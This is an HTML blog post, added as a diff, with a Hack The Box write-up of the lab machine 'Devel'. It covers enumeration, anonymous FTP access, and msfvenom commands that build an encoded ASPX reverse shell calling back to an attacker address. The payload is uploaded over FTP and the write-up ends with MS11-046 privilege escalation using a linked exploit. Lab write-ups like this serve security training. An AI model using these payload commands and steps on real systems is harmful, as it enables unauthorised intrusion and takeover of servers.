@@ -1,0 +1,345 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<link rel="icon" href="../images/favicon.ico">
+		<title>Devel</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="../assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a class="logo">The Defense</a>
+					</header>
+
+				<!-- Nav -->
+					<nav id="nav">
+						<ul class="links">
+							<li><a href="../index.html">Home</a></li>
+							<li class="active"><a href="../posts.html">Posts</a></li>
+							<li><a href="../research.html">Research</a></li>
+							<li><a href="../stories.html">Stories</a></li>
+							<li><a href="../references.html">Links</a></li>
+						</ul>
+						<ul class="icons">
+							<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
+							<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
+							<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
+							<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+						<div class="wrapper">
+
+						<!-- Post -->
+                  <section class="post">
+                    <body>
+                      <article id="first-post">
+												<a href="index.html"><img src="../images/matt-stafford.png" class="avatar" alt="avatar"> </img></a>
+                        <h2>&emsp; Devel Writeup</h2>
+                        <div class="box">
+                          <p>&emsp; &emsp; Good afternoon Tim, here is another writeup on another mostly easy HTB machine called "Devel". &nbsp;It was rated a 3/10 from most members
+														with a high number of 1/10 and 2/10 ratings. &nbsp;This one gave me a headache due to Metasploit not working or not using it correctly. &nbsp;I spun my wheels
+														on manual Windows privilege escalation tactics for two weeks before retrying my original strategy and it worked. &nbsp;Like the Lions defense, I was stunned.
+                           </p>
+
+													 <br><h2>Contents</h2>
+													 <a href="#Enumeration" style="color:blue;">Initial Enumeration</a><br>
+													 <a href="#IIS" style="color:blue;">Checking Out IIS</a><br>
+													 <a href="#FTP" style="color:blue;">FTP Fingerprinting</a><br>
+													 <a href="#Foothold" style="color:blue;">Gaining Foothold</a><br>
+													 <a href="#Post-Exploitation" style="color:blue;">Post-Exploitation</a><br>
+													 <a href="#Privesc" style="color:blue;">Local Privilege Escalation</a><br>
+													 <a href="#Thoughts" style="color:blue;">Thoughts</a><br><br><br>
+
+
+
+								<br><section id="Enumeration"><h2>Initial Enumeration</h2></section>
+													 <p>
+														 &emsp; &emsp;Step one is to launch my initial and OS nmap scans on the target IP. &nbsp;The latter scan lists software versions for the services and
+														 most likely OS. &nbsp;It appears Windows 8 is the most likely guess with Windows Server 2008 Release 2 (R2) also having high confidence. &nbsp;The
+														 below results show FTP and HTTP ports open.
+													 </p>
+													 <center><div class="image post"><img src="../images/devel/1-nmap-initial.png" alt="" /></div></center><br>
+													 <center><div class="image post"><img src="../images/devel/2-nmap-OS.png" alt="" /></div></center><br>
+
+													 <p>
+
+													 </p>
+
+
+
+								<br><section id="IIS"><h2>Checking Out IIS</h2></section>
+
+												<p>
+													&emsp; &emsp;I decided on an initial google search of HTTP software to better enumerate port 80. &nbsp;Results come back with immediate exploits for
+													IIS 7.5. &nbsp;This is a good sign.
+												</p>
+												<center><div class="image post"><img src="../images/devel/3-first-google.png" alt="" /></div></center><br>
+
+												<p>
+													In addition to noting exploits, I further enumerated port 80 by running <i>nikto</i> on the host. &nbsp;Below are the findings.
+												</p>
+												<center><div class="image post"><img src="../images/devel/4-nikto-results.png" alt="" /></div></center><br>
+												<p>
+												I also run dirbuster on the host with a medium length wordlist to webcrawl port 80. &nbsp;The results did not inspire confidence as no directories were
+												uncovered past root. &nbsp;Just to be safe, I repeated the test for html extensions but received the same result.
+												</p>
+												<center><div class="image post"><img src="../images/devel/5-dirbuster.png" alt="" /></div></center><br>
+												<center><div class="image post"><img src="../images/devel/5-dirbuster-results.png" alt="" /></div></center><br>
+
+
+
+								<br><section id="FTP"><h2>FTP Fingerprinting</h2></section>
+
+												<p>
+													&emsp; &emsp;Nmap scan results returned an FTP code 230 allowing for anonymous login. &nbsp;This looks interesting so I pivot to a banner grab to
+													get the version: <i>Microsoft FTP Service</i>.
+												</p>
+												<center><div class="image post"><img src="../images/devel/5-nmap-ftp.png" alt="" /></div></center><br>
+												<center><div class="image post"><img src="../images/devel/5-ftp-banner-grab.png" alt="" /></div></center><br>
+												<p>
+													Anonymous login works by entering "Anonymous" (or "anonymous") for both username and password. &nbsp;An ftp command prompt is returned with appropriate commands below.
+												</p>
+												<center><div class="image post"><img src="../images/devel/7-anon-login.png" alt="" /></div></center><br>
+
+												<p>
+													Using <i>dir</i>, I found a start page, an image, and a directory. &nbsp;It took a second to learn FTP commands but I was able to download
+													the <i>htm</i> page to inspect. &nbsp;I also opened FTP in the web browser for better navigation.
+												</p>
+												<center><div class="image post"><img src="../images/devel/8-ftp-dir.png" alt="" /></div></center><br>
+												<center><div class="image post"><img src="../images/devel/9-ftp-browser.png" alt="" /></div></center><br>
+
+												<p>
+													All this is great but is not actually producing leads on vulnerabilities or exploits. &nbsp;Going back to the drawing board, I googled "microsoft ftp IIS exploit 7.5"
+													for narrower results. &nbsp;I came across a <a href="https://blog.sucuri.net/2015/04/website-firewall-critical-microsoft-iis-vulnerability-ms15-034.html" target="_blank" style="color:blue;">blog post</a>
+													with details on RCE vulnerability MS15-034. &nbsp;The vulnerability appears to be present in the target (Windows Server 2008 R2) and is rated critical! &nbsp;Running the
+													curl command according to instructions produces the expected output below, which means the target is not patched.
+												</p>
+												<center><div class="image post"><img src="../images/devel/10-vuln-check.png" alt="" /></div></center><br>
+
+												<p>
+													Nmap also confirms a RCE vulnerability exists.
+												</p>
+												<center><div class="image post"><img src="../images/devel/11-nmap-check.png" alt="" /></div></center><br>
+
+												<!-- <p>
+													While googling for "Anonymous FTP exploit", I encountered another <a href="https://rastating.github.io/how-i-hacked-boby" target="_blank" style="color:blue;">blog post</a> with a
+													similar situation as mine.
+												</p> -->
+
+
+								<br><section id="Foothold"><h2>Gaining Foothold</h2></section>
+
+												<p>
+													&emsp; &emsp;While googling for "Anonymous FTP exploit", I encountered another <a href="https://rastating.github.io/how-i-hacked-boby" target="_blank" style="color:blue;">blog post</a> with a
+													similar situation as mine. &nbsp;It turns out you can use <i>msfvenom</i> to create a manual payload and upload it via anonymous FTP. &nbsp;The payload command is below.
+												</p>
+
+												<pre>
+													<code class="language-bash" style=display:block;white-space:pre-wrap>
+msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
+
+													</code>
+												</pre>
+
+												<p>
+												Upload the shell with Anonymous FTP using the <i>put</i> command. &nbsp;Confirm with <i>dir</i>.
+												</p>
+
+												<pre>
+													<code class="language-bash" style=display:block;white-space:pre-wrap>
+root@kali:~# ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp>
+ftp>
+ftp>
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       < DIR >          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp>
+ftp>
+ftp> put shell.aspx
+local: shell.aspx remote: shell.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+2899 bytes sent in 0.00 secs (35.9052 MB/s)
+ftp>
+ftp>
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       < DIR >          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+06-05-20  01:36AM                 2899 shell.aspx
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+ftp>
+
+													</code>
+												</pre>
+
+												<p>
+												Once uploaded, start a netcat listener using the same port in the reverse TCP payload.
+												</p>
+												<center><div class="image post"><img src="../images/devel/12-listener.png" alt="" /></div></center><br>
+
+												<p>
+												At this point, everything is set up so invoke the shell by navigating to <i>http://10.10.10.5/shell.aspx</i> in a web browser. &nbsp;The page should appear
+												 blank upon invokation. &nbsp;The netcat listener will pick up the reverse TCP beacon and provide a shell!
+												</p>
+												<center><div class="image post"><img src="../images/devel/13-empty-page.png" alt="" /></div></center><br>
+												<center><div class="image post"><img src="../images/devel/12-listener-shell.png" alt="" /></div></center><br>
+
+
+
+								<br><section id="Post-Exploitation"><h2>Post-Exploitation</h2></section>
+
+												<p>
+													&emsp; &emsp;Shortly after gaining a shell, I check privileges with <i>whoami</i>. &nbsp;The result is a low-level service account, <i>iis apppool\web</i>, used for
+													maintenance actions. &nbsp;Permissions are very limited as depicted in the next screenshot. &nbsp;I could not access any user folders.
+												</p>
+												<center><div class="image post"><img src="../images/devel/18-whoami.png" alt="" /></div></center>
+												<center><div class="image post"><img src="../images/devel/14-attempt-root.png" alt="" /></div></center><br>
+
+												<p>
+													My next step was to enumerate the target for subsequent privilege escalation attempts. &nbsp;<i>systeminfo</i> returns more accurate information about the box I'm on. &nbsp;I piped it
+													into <i>findstr</i> to fingerprint OS name and build. &nbsp;It was actually different than my earlier prediction. &nbsp;I also confirmed an x86 processor.
+												</p>
+												<center><div class="image post"><img src="../images/devel/14-sysinfo.png" alt="" /></div></center>
+												<center><div class="image post"><img src="../images/devel/17-processor-type.png" alt="" /></div></center><br>
+
+												<p>
+													I searched for exploits specific to 6.1.7600 Build 7600 and found an interesting local privilege escalation <a href="https://www.exploit-db.com/exploits/40564" target="_blank" style="color:blue;">exploit</a>
+													for x86-based Windows systems. &nbsp;<a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2011/ms11-046?redirectfrom=MSDN" target="_blank" style="color:blue;">MS11-046</a> describes a vulnerability
+													 in the ancillary function driver where <i>afd.sys</i> improperly validates user mode input. &nbsp;It goes without saying <i>afd.sys</i> runs
+													with system level permissions. &nbsp;You can grab the C code and compile it from the exploit-db link, or you can download the compiled executable
+													<a href="https://www.github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe" target="_blank" style="color:blue;">here</a>!<br>
+													&emsp; &emsp;Trouble occurred when attempting to run the exploit on the target machine. &nbsp;I was unable to run the executable and received an error message: <i>This program cannot be run in DOS mode.</i>
+													 &nbsp;That setback, combined with manual Windows privilege escalation attempts, convinced me to take a look at Metasploit again. &nbsp;Earlier I had trouble gaining initial foothold due to the Reverse TCP
+													 payload not activating. &nbsp;Using lessons learned from netcat listening, I reopened Metasploit and ensured the <i>multi/handler</i> was activated before invoking <i>shell.aspx</i>.
+													  &nbsp;The new <i>msfvenom</i> command was <code>msfvenom -f aspx -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx</code>. &nbsp;I logged onto anonymous FTP,
+														deleted the old <i>shell.aspx</i>, and uploaded the new one. &nbsp;Below are the payload options.
+												</p>
+												<center><div class="image post"><img src="../images/devel/20-msf-options.png" alt="" /></div></center><br>
+
+												<p>
+													Run the <i>multi/handler</i> exploit and invoke <i>shell.aspx</i> once again and a meterpreter shell pops up!
+												</p>
+												<center><div class="image post"><img src="../images/devel/21-meterpreter-success.png" alt="" /></div></center><br>
+
+
+
+								<br><section id="Privesc"><h2>Local Privilege Escalation</h2></section>
+
+												<p>
+													&emsp; &emsp;Due to earlier enumeration and unsuccessful file execution attempts, escalating privileges happened very quickly. &nbsp;During enumeration, I noticed tons of simple techniques through
+													meterpreter shells. &nbsp;My problem earlier was actually getting the meterpreter shell. &nbsp;Once I have it, all the hard work is done! &nbsp;I tried <i>getsystem</i> and
+													realized root access is not that stupidly easy!
+												</p>
+												<center><div class="image post"><img src="../images/devel/22-getsystem-attempt.png" alt="" /></div></center><br>
+
+												<p>
+													Fair enough. &nbsp;Sometimes it works but not in this case. &nbsp;There was trouble running executables on the target through a shell. &nbsp;With meterpreter, I can try again. &nbsp;Upload the exploit
+													using meterpreter's <i>upload</i> command. &nbsp;I tried uploading it to the <i>c:\Windows\system32</i> folder but failed due to write permissions. &nbsp;Instead I targeted the
+													Public folder.
+												</p>
+												<center><div class="image post"><img src="../images/devel/23-upload-exploit.png" alt="" /></div></center><br>
+
+												<p>
+													So far so good. &nbsp;The next step is to enter interactive mode using meterpreter's <i>shell</i> command. &nbsp;Navigate to <i>c:\Users\Public</i> and confirm the exploit is present.
+												</p>
+												<center><div class="image post"><img src="../images/devel/24-initiate-shell.png" alt="" /></div></center><br>
+
+												<p>
+													Finally, invoke the exploit and check with <i>whoami</i>.
+												</p>
+												<center><div class="image post"><img src="../images/devel/25-launch-exploit.png" alt="" /></div></center>
+												<center><div class="image post"><img src="../images/devel/26-system-permissions.png" alt="" /></div></center><br>
+
+												<p>
+													Success! &nbsp;Navigate back to the <i>Administrator\Desktop</i> folder and dump <i>root.txt.txt</i> for the flag.
+												</p>
+												<center><div class="image post"><img src="../images/devel/27-root-flag.png" alt="" /></div></center><br>
+
+												<p>
+													Repeat for user <i>babis</i>.
+												</p>
+												<center><div class="image post"><img src="../images/devel/28-user-flag.png" alt="" /></div></center><br>
+
+
+
+								<br><section id="Thoughts"><h2>Thoughts</h2></section>
+												<p>
+													&emsp; &emsp;<i>Devel</i> is a great learning machine since many steps were counterintuitive. &nbsp;Metasploit was not working in the beginning so I resorted
+													to a manual listener for initial exploitation. &nbsp;I fell into a Windows privilege escalation rabit hole and could not rely on traditionally reliable methods like
+													running exploits in the Windows command line. &nbsp;The silver lining of wasting that time was front-loading my privilege escalation enumeration. &nbsp;Once I circled
+													back and achieved a meterpreter shell, I simply executed the <i>ms11-046</i> exploit and game over! &nbsp;Overall I rate this
+													a 3/10 difficulty due to how easily you can fall into a rabbit hole.
+												</p><br>
+
+
+
+                        </div>
+
+                      </article>
+                    </body>
+                  </section>
+
+							</div>
+					</div>
+
+				<!-- Footer -->
+					<footer id="footer">
+
+						<section class="split contact">
+
+							<section>
+								<h3>Social</h3>
+								<ul class="icons alt">
+									<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
+									<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
+									<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
+									<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
+								</ul>
+							</section>
+						</section>
+					</footer>
+
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net" target="_blank">HTML5 UP</a></li></ul>
+					</div>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
